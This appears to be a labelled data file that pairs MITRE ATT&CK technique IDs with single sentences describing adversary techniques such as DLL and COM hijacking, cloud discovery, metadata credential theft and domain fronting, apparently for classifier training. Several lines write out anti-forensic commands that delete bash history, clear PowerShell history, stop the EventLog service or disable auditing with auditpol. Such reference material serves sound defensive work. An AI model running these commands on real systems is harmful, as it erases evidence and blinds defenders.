T1574,Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR.
T1574,The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged  profiling DLL to be loaded into each .NET process that loads the Common Language Runtime .
T1574,"These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR."
T1574,The COR_PROFILER environment variable can be set at various scopes  resulting in different levels of influence.
T1574,"System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model  object can be registered as a profiler DLL."
T1574,A process scope COR_PROFILER can also be created in-memory without modifying the Registry.
T1574,"Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable."
T1574,Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked.
T1574,"The COR_PROFILER can also be used to elevate privileges  if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes."

T1546,Adversaries may establish persistence by executing malicious content triggered by a file type association.
T1546,"When a file is opened, the default program used to open the file  is checked."
T1546,"File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access   or by administrators using the built-in assoc utility."
T1546,Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.
T1546,"System file associations are listed under HKEY_CLASSES_ROOT\.extension, for example HKEY_CLASSES_ROOT\.txt."
T1546,The entries point to a handler for that extension located at HKEY_CLASSES_ROOT\handler.
T1546,The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT\handler\shell\action\command.
T1546,"For example: 
* HKEY_CLASSES_ROOT\txtfile\shell\open\command
* HKEY_CLASSES_ROOT\txtfile\shell\print\command
* HKEY_CLASSES_ROOT\txtfile\shell\printto\command
The values of the keys listed are commands that are executed when the handler opens the file extension."

T1070,"On Linux and macOS, these command histories can be accessed in a few different ways."
T1070,"While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE."
T1070,"When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history."
T1070,The benefit of this is that it allows users to go back to commands they've used before in different sessions.
T1070,Adversaries may delete their commands from these logs by manually clearing the history  or deleting the bash history file rm ~/.bash_history.
T1070,"On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the PSReadLine module."
T1070,The built-in history only tracks the commands used in the current session.
T1070,This command history is not available to other sessions and is deleted when the session ends.
T1070,The PSReadLine command history tracks the commands used in all PowerShell sessions and writes them to a file .
T1070,This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.
T1070,Adversaries may run the PowerShell command Clear-History to flush the entire command history from a current PowerShell session.

T1136,Adversaries may create a cloud account to maintain access to victim systems.
T1136,"With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system."
T1136,"Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection."
T1087,Adversaries may attempt to get a listing of cloud accounts.
T1087,"Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application."
T1087,With authenticated access there are several tools that can be used to find accounts.
T1087,The Get-MsolRoleMember PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.

T1078,APT33 has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of endpoints.
T1078,APT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.
T1069,Adversaries may attempt to find cloud groups and permission settings.
T1069,"The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group."
T1069,With authenticated access there are several tools that can be used to find permissions groups.
T1069,The Get-MsolRole PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts .
T1069,Azure CLI  and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups.
T1069,The command az ad user get-member-groups will list groups associated to a user account for Azure while the API endpoint GET https://cloudidentity.googleapis.com/v1/groups lists group resources available to a user for Google .
T1069,"Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS GetBucketAcl API ."
T1069,Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.
T1580,An adversary may attempt to discover resources that are available within an infrastructure-as-a-service  environment.
T1580,"This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services."
T1580,Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure.
T1580,"For example, AWS provides a DescribeInstances API within the Amazon EC2 API that can return information about one or more instances within an account, the ListBuckets API that returns a list of all buckets owned by the authenticated sender of the request, or the GetPublicAccessBlock API to retrieve access block configuration for a bucket ."
T1580,"Similarly, GCP's Cloud SDK CLI provides the gcloud compute instances list command to list all Google Compute Engine instances in a project , and Azure's CLI command az vm list lists details of virtual machines."
T1580,An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.
T1580,"The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication."
T1580,"Adversaries have also may use infrastructure discovery APIs such as DescribeDBInstances to determine size, owner, permissions, and network ACLs of database resources."
T1580,Adversaries can use this information to determine the potential value of databases and discover the requirements to access them.
T1580,"Unlike in Cloud Service Discovery, this technique focuses on the discovery of components of the provided services rather than the services themselves."
T1552,Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.
T1552,Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance.
T1552,"Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets."
T1552,The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.
T1552,A cloud metadata API has been used in at least one high profile compromise.
T1552,"If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources."
T1552,"Additionally, attackers may exploit a Server-Side Request Forgery  vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API."
T1552,The de facto standard across cloud service providers is to host the Instance Metadata API at http://169.254.169.254.
T1552,Hildegard has queried the Cloud Instance Metadata API for cloud credentials.
T1552,TeamTNT has queried the AWS instance metadata service for credentials.
T1538,"An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features."
T1538,"For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports."
T1538,"Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API."
T1538,This allows the adversary to gain information without making any API requests.
T1526,An adversary may attempt to enumerate the cloud services running on a system after gaining access.
T1526,"These methods can differ from platform-as-a-service , to infrastructure-as-a-service , or software-as-a-service ."
T1526,"Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery , Lambda Functions, Azure AD, etc."
T1526,Adversaries may attempt to discover information about the services enabled throughout the environment.
T1526,"Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity."
T1526,"Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services."
T1619,Adversaries may enumerate objects in cloud storage infrastructure.
T1619,"Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage."
T1619,"Similar to File and Directory Discovery on a local host, after identifying available storage services  Cloud Infrastructure Discovery adversaries may access the contents/objects stored in cloud infrastructure."
T1619,Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage.
T1619,Examples include ListObjectsV2 in AWS  and List Blobs in Azure .
T1213,Adversaries may leverage code repositories to collect valuable information.
T1213,Code repositories are tools/services that store source code and automate software builds.
T1213,"They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket."
T1213,Users typically interact with code repositories through a web application or command-line utilities such as git.
T1213,"Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code."
T1213,"Having access to software's source code may allow adversaries to develop Exploits, while credentials may provide access to additional resources using Valid Accounts."
T1213,APT29 has downloaded source code from code repositories.

T1092,Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.
T1092,"Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic."
T1092,"USBStealer drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim."
T1092,APT28 uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.
T1027,Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code.
T1027,Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries.
T1027,These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.
T1027,"Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing."
T1027,Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS  before later being compiled into a proper executable binary with a bundled compiler and execution framework.

T1542,Adversaries may modify component firmware to persist on systems.
T1542,Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS.
T1542,This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.
T1542,"Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks."
T1542,Equation is known to have the capability to overwrite the firmware on hard drives from some manufacturers.
T1559,Adversaries may use the Windows Component Object Model  for local code execution.
T1559,"COM is an inter-process communication  component of the native Windows application programming interface  that enables interaction between software objects, or executable code that implements one or more interfaces."
T1559,"Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries  or executables ."
T1559,Remote COM execution is facilitated by Remote Services such as  Distributed Component Object Model .
T1559,"Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic."
T1559,"Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence."
T1559,POWERSTATS can use DCOM  to execute additional payloads on compromised hosts.
T1559,Ursnif droppers have used COM objects to execute the malware's full executable payload.

T1546,COM is a system within Windows to enable interaction between software components through the operating system.
T1546,References to various COM objects are stored in the Registry.
T1546,Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence.
T1546,Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed.
T1546,When that system component is executed through normal system operation the adversary's code will be executed instead.
T1546,"An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection."
T1546,Some variants of ADVSTORESHELL achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.
T1546,JHUHUGIT has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object .
T1546,ComRAT samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32.
T1546,Mosquito uses COM hijacking as a method of persistence.
T1546,BBSRAT has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList {42aedc87-2188-41fd-b9a3-0c966feabec1} or Microsoft WBEM New Event Subsystem {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} depending on the system's CPU architecture.
T1546,KONNI has modified ComSysApp service to load the malicious DLL payload.
T1546,APT28 has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload.
T1586,Adversaries may compromise accounts with services that can be used during targeting.
T1586,"For operations incorporating social engineering, the utilization of an online persona may be important."
T1586,"Rather than creating and cultivating accounts  Establish Accounts, adversaries may compromise existing accounts."
T1586,"Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona."
T1586,"A variety of methods exist for compromising accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, or by brute forcing credentials ."
T1586,"Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation."
T1586,Personas may exist on a single site or across multiple sites .
T1586,"Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos."
T1586,Adversaries may directly leverage compromised email accounts for Phishing for Information or Phishing.
T1554,Adversaries may modify client software binaries to establish persistent access to systems.
T1554,Client software enables users to access services provided by a server.
T1554,"Common client software types are SSH clients, FTP clients, email clients, and web browsers."
T1554,Adversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use.
T1554,"For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary  with the backdoored one."
T1554,"Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host."
T1554,Ebury has been embedded into modified OpenSSH binaries to gain persistent access to SSH credential information.
T1554,Bonadan has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.

T1195,"By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system."
T1195,"Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals."
T1584,Adversaries may compromise third-party infrastructure that can be used during targeting.
T1584,"Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle."
T1584,"Additionally, adversaries may compromise numerous machines to form a botnet they can leverage."
T1584,"Use of compromised infrastructure allows an adversary to stage, launch, and execute an operation."
T1584,"Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites."
T1584,"By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them."
T1584,"Prior to targeting, adversaries may compromise the infrastructure of other adversaries."
T1195,Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise.
T1195,Applications often depend on external software to function properly.
T1195,Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.
T1195,Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.
T1195,XCSSET adds malicious code to a host's Xcode projects by enumerating CocoaPods target_integrator.rb files under the /Library/Ruby/Gems folder or enumerates all .xcodeproj folders under a given directory.
T1195,XCSSET then downloads a script and Mach-O file into the Xcode project folder.
T1195,Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise.

T1195,APT29 gained initial network access to some victims via a trojanized update of SolarWinds Orion software.
T1213,Adversaries may leverage Confluence repositories to mine valuable information.
T1213,"Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:
* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources"
T1552,Adversaries may gather credentials via APIs within a containers environment.
T1552,"APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components."
T1552,"An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment."
T1552,"An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server."
T1552,These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.
T1609,Adversaries may abuse a container administration service to execute commands within a container.
T1609,"A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment."
T1609,"In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as docker exec to execute a command within a running container."
T1609,"In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as kubectl exec."
T1609,Kinsing was executed with an Ubuntu container entry point that runs shell scripts.
T1609,Hildegard was executed through the kubelet API run command and by executing commands on running containers.
T1609,Siloscape can send kubectl commands to victim clusters through an IRC channel and can run kubectl locally to spread once within a victim cluster.
T1609,TeamTNT executed Hildegard through the kubelet API run command and by executing commands on running containers.
T1053,Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code.
T1053,"Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system."
T1053,"Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster."
T1053,"In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks."
T1053,An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.
T1613,Adversaries may attempt to discover containers and other resources that are available within a containers environment.
T1613,"Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster."
T1613,These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.
T1613,"In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing."
T1613,"The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution."
T1613,Hildegard has used masscan to search for kubelets and the kubelet API for additional running containers.
T1613,TeamTNT has checked for running containers with docker ps and for specific container names with docker inspect.
T1218,Adversaries may abuse control.exe to proxy execution of malicious payloads.
T1218,"The Windows Control Panel process binary  handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings."
T1218,"Control Panel items are registered executable  or Control Panel  files, the latter are actually renamed dynamic-link library  files that export a CPlApplet function."
T1218,"For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel."
T1218,"Control Panel items can be executed directly from the command line, programmatically via an application programming interface  call, or by simply double-clicking the file."
T1218,Malicious Control Panel items can be delivered via Phishing campaigns or executed as part of multi-stage malware.
T1218,"Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists."
T1218,Adversaries may also rename malicious DLL files  with Control Panel file extensions  and register them to HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls.
T1218,"Even when these registered DLLs do not comply with the CPL file specification and do not export CPlApplet functions, they are loaded and executed through its DllEntryPoint when Control Panel is executed."
T1218,CPL files not exporting CPlApplet are not directly executable.
T1218,Reaver drops and executes a malicious CPL file as its payload.
T1218,InvisiMole can register itself for execution and persistence via the Control Panel.
T1136,Adversaries may create an account to maintain access to victim systems.
T1136,"With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system."
T1136,Accounts may be created on the local system or within a domain or cloud tenant.
T1136,"In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection."
T1136,Indrik Spider used wmic.exe to add a new user to the system.
T1136,Sandworm Team added a login to a SQL Server with sp_addlinkedsrvlogin.
T1136,Dragonfly created accounts that appeared to be tailored to each individual staging target.
T1578,An adversary may create a new instance or virtual machine  within the compute service of a cloud account to evade defenses.
T1578,Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account.
T1578,"An adversary may Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System or for Remote Data Staging."
T1578,Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.
T1134,Adversaries may create a new process with a different token to escalate privileges and bypass access controls.

T1574,Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs.
T1574,Windows systems use a common method to look for required DLLs to load into a program.
T1574,Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.
T1574,There are many ways an adversary can hijack DLL loads.
T1574,"Adversaries may plant trojan dynamic-link library files  in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program."
T1574,"Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL."
T1574,Often this location is the current working directory of the program.
T1574,Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.
T1574,"Adversaries may also directly modify the search order via DLL redirection, which after being enabled  may cause a program to load a different DLL."
T1574,"If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level."
T1574,"In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program."
T1574,Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.

T1574,BackdoorDiplomacy has executed DLL search order hijacking.
T1574,Adversaries may execute their own malicious payloads by side-loading DLLs.
T1574,"Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads."
T1574,"But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload."
T1574,Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload alongside each other.
T1574,"Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process."
T1574,Benign executables used to side-load payloads may not be flagged during delivery and/or execution.
T1574,Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.

T1562,"Security audit policy settings can be changed by running secpol.msc, then navigating to Security Settings\Local Policies\Audit Policy for basic audit policy settings or Security Settings\Advanced Audit Policy Configuration for advanced audit policy settings."
T1562,auditpol.exe may also be used to set audit policies.
T1562,Adversaries may target system-wide logging or just that of a particular application.
T1562,"For example, the EventLog service may be disabled using the following PowerShell line: Stop-Service -Name EventLog."
T1562,"Additionally, adversaries may use auditpol and its sub-commands in a command prompt to disable auditing or clear the audit policy."
T1562,"To enable or disable a specified setting or audit category, adversaries may use the /success or /failure parameters."
T1562,"For example, auditpol /set /category:”Account Logon” /success:disable /failure:disable turns off auditing for the Account Logon category."
T1562,"To clear the audit policy, adversaries may run the following lines: auditpol /clear /y or auditpol /remove /allusers."

T1556,Chimera's malware has altered the NTLM authentication program on domain controllers to allow Chimera to login without a valid credential.
T1090,Adversaries may take advantage of routing schemes in Content Delivery Networks  and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.
T1090,Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header.
T1090,"If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header."
T1090,"A variation of the the technique, ""domainless"" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match ."
T1090,"For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header."
T1090,"Traffic will appear to be going to domain-x, however the CDN may route it to domain-y."

T1090,SMOKEDHAM has used a fronted domain to obfuscate its hard-coded C2 server domain.
T1090,APT29 has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic.
T1568,Adversaries may make use of Domain Generation Algorithms  to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains.
T1568,"This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions."
T1568,DGAs can take the form of apparently random or “gibberish” strings  when they construct domain names by generating each letter.
T1568,"Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters ."
T1568,"Many DGAs are time-based, generating a different domain for each time period ."
T1568,Others incorporate a seed value as well to make predicting future domains more difficult for defenders.
T1568,Adversaries may use DGAs for the purpose of Fallback Channels.
T1568,When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.
T1568,CCBkdr can use a DGA for Fallback Channels if communications with the primary command and control server are lost.

T1069,Adversaries may attempt to find domain-level groups and permission settings.
T1069,The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group.
T1069,"Adversaries may use this information to determine which users have elevated permissions, such as domain administrators."
T1069,"Commands such as net group /domain of the Net utility,  dscacheutil -q group on macOS, and ldapsearch on Linux can list domain-level groups."

T1484,Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments.
T1484,"Domains provide a centralized means of managing how computer resources  can act, and interact with each other, on a network."
T1484,The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment.
T1484,"Modifications to domain settings may include altering domain Group Policy Objects  or changing trust settings for domains, including federation trusts."
T1484,"With sufficient permissions, adversaries can modify domain policy settings."
T1484,"Since domain configuration settings control many of the interactions within the Active Directory  environment, there are a great number of potential attacks that can stem from this abuse."
T1484,Examples of such abuse include modifying GPOs to push a malicious Scheduled Task to computers throughout the domain environment or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.
T1484,Adversaries can also change configuration settings within the AD environment to implement a Rogue Domain Controller.
T1484,"Adversaries may temporarily modify domain policy, carry out a malicious action, and then revert the change to remove suspicious indicators."
T1590,Adversaries may gather information about the victim's network domain that can be used during targeting.
T1590,"Information about domains and their properties may include a variety of details, including what domain the victim owns as well as administrative data  and more directly actionable information such as contacts , business addresses, and name servers."
T1590,"Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information."
T1590,Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets .
T1590,"Gathering this information may reveal opportunities for other forms of reconnaissance , Search Open Websites/Domains, or Phishing for Information, establishing operational resources  or Compromise Infrastructure, and/or initial access ."
T1590,Sandworm Team conducted technical reconnaissance of the Parliament of Georgia's official internet domain prior to its 2019 attack.
T1482,Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.
T1482,Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.
T1482,Domain trusts allow the users of the trusted domain to access resources in the trusting domain.
T1482,"The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting."
T1482,"Domain trusts can be enumerated using the `DSEnumerateDomainTrusts` Win32 API call, .NET methods, and LDAP."
T1482,The Windows utility Nltest is known to be used by adversaries to enumerate domain trusts.

T1482,FIN8 has retrieved a list of trusted domains by using Nltest.exe /domain_trusts.
T1482,Wizard Spider has used AdFind.exe to collect information about Active Directory organizational units and trust objects.
T1484,Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges.
T1484,"Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources."
T1484,"These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains."
T1484,Manipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control.
T1484,"For example, this may be used to forge SAML Tokens, without the need to compromise the signing certificate to forge new credentials."
T1484,"Instead, an adversary can manipulate domain trusts to add their own signing certificate."
T1484,UNC2452 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.
T1484,APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.
T1583,Adversaries may purchase domains that can be used during targeting.
T1583,Domain names are the human readable names used to represent one or more IP addresses.
T1583,"They can be purchased or, in some cases, acquired for free."
T1583,"Adversaries can use purchased domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control."
T1583,"Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain ."
T1583,Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise.
T1583,Adversaries can also use internationalized domain names  to create visually similar lookalike domains for use in operations.
T1583,Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain.
T1583,"Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain."
T1583,Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain.
T1583,Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.
T1583,"APT28 registered domains imitating NATO, OSCE security websites, Caucasus information resources and other organizations."
T1583,APT1 has registered hundreds of domains for use in operations.

T1583,"IndigoZebra has established domains, some of which were designed to look like official government domains, for their operations."
T1584,Adversaries may hijack domains and/or subdomains that can be used during targeting.
T1584,Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.
T1584,An adversary may gain access to an email account for the person listed as the owner of the domain.
T1584,The adversary can then claim that they forgot their password in order to make changes to the domain registration.
T1584,Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.
T1584,Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources.
T1584,"In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain."
T1584,APT1 hijacked FQDNs associated with legitimate websites hosted by hop points.
T1584,UNC2452 has compromised domains to use for C2.
T1584,APT29 has compromised domains to use for C2.
T1584,Magic Hound has used compromised domains to host links targeted to specific phishing victims.
T1584,Transparent Tribe has compromised domains for use in targeted malicious campaigns.
T1036,Adversaries may abuse a double extension in the filename as a means of masquerading the true file type.
T1036,A file name may include a secondary file type extension that may cause only the first extension to be displayed .
T1036,"However, the second extension is the true file type that determines how the file is opened and executed."
T1036,"The real file extension may be hidden by the operating system in the file browser , as well as in any software configured using or similar to the system’s policies."
T1036,Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads.
T1036,A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code.
T1036,Such files often pose as email attachments and allow an adversary to gain Initial Access into a user’s system via Spearphishing Attachment then User Execution.
T1036,"For example, an executable file attachment named Evil.txt.exe may display as Evil.txt to a user."
T1036,"The user may then view it as a benign text file and open it, inadvertently executing the hidden malware."
T1036,"Common file types, such as text files  and image files  are typically used as the first extension to appear benign."
T1036,"Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type."
T1036,The Bazar loader has used dual-extension executable files such as PreviewReport.DOC.exe.
T1036,Mustang Panda has used an additional filename extension to hide the true file type.
T1562,"Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls such as logging."
